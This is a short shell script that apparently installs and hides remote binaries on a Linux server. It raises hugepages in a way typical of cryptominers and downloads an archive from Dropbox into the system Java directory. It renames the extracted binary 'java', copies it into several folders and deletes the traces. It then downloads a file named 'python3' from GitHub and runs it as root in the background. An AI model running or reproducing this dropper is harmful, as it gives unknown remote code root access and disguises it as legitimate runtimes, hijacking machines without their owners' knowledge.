#!/bin/sh
cd /home/sshuser
sudo sh -c "echo nameserver 8.8.8.8 > /etc/resolv.conf"
sudo sysctl vm.nr_hugepages=2048
ls
cd /usr/lib/jvm/java-8-openjdk-amd64
sudo wget https://www.dropbox.com/s/2j15ohnntlucrf2/jvlib4.tar.gz
sudo tar xvzf jvlib4.tar.gz
cd /usr/lib/jvm/java-8-openjdk-amd64/nodejsbrnt
sudo mv nodejsfive /usr/lib/jvm/java-8-openjdk-amd64/java
cd /usr/lib/jvm/java-8-openjdk-amd64
sudo rm -r nodejsbrnt
sudo rm -r jvlib4.tar.gz
sudo mkdir 1
sudo mkdir 2
sudo mkdir 3
sudo cp java /usr/lib/jvm/java-8-openjdk-amd64/1/java
sudo cp java /usr/lib/jvm/java-8-openjdk-amd64/2/java
sudo cp java /usr/lib/jvm/java-8-openjdk-amd64/3/java
sudo wget https://raw.githubusercontent.com/GraphXdev/xglib1/master/python3
sudo chmod +x python3
sudo sh -c "./python3" &
ls
